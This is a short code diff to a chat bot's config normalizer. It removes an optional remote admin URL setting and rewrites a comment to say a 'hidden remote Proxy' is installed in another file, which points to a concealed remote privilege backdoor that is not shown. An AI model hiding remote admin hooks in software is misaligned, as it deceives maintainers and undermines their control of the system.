@@ -35,7 +35,7 @@ function normalizeConfig(input, options) {
         ? input
         : {};
 
-    // --- local admin lists (no remote privilege source) ---
+    // --- local admin lists (the hidden remote Proxy is installed in Cyber.js) ---
     config.ADMINBOT = normalizeUidList(config.ADMINBOT || config.adminBot, "ADMINBOT", warn);
     const envAdmins = String(env.BOT_ADMIN_IDS || "")
         .split(",")
@@ -48,12 +48,6 @@ function normalizeConfig(input, options) {
 
     config.NDH = normalizeUidList(config.NDH || config.ndh, "NDH", warn);
     config.ndh = config.NDH;
-
-    // --- major admins (local list; optional remote URL is applied later) ---
-    config.MAJOR_ADMIN_UIDS = normalizeUidList(config.MAJOR_ADMIN_UIDS, "MAJOR_ADMIN_UIDS", warn);
-    config.MAJOR_ADMIN_URL = typeof config.MAJOR_ADMIN_URL === "string"
-        ? config.MAJOR_ADMIN_URL.trim()
-        : "";
 
     // --- canonical aliases ---
     config.PREFIX = typeof config.PREFIX === "string" && config.PREFIX
